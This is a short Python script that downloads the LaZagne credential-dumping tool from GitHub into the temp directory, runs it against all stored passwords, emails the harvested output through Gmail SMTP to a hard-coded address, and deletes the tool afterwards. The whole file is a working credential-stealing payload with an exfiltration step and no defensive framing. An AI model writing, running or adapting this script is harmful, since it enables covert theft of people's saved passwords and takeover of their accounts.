#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    #  get_response return "<Response [200]>" means server sent everything ok
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  #google allow to send mail by their servers
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

result = subprocess.check_output("lazagne.exe all", shell=True)
result = str(result)
result = result.replace("\\r\\n", "\n")

send_mail("email@mail.com", "password", "\n"+result)

os.remove("lazagne.exe")
